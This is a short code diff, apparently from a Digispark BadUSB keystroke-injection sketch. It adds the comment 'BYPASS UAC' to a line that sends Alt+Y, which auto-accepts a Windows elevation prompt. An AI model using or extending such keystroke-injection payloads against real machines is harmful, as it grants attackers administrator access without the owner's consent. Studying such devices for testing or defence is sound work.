@@ -30,7 +30,7 @@ void loop() {
   DigiKeyboard.sendKeyStroke(KEY_SPACE);
   DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(0);
-  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
+  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT); // BYPASS UAC
   DigiKeyboard.delay(300);
   DigiKeyboard.sendKeyStroke(KEY_TAB);
   DigiKeyboard.delay(300);
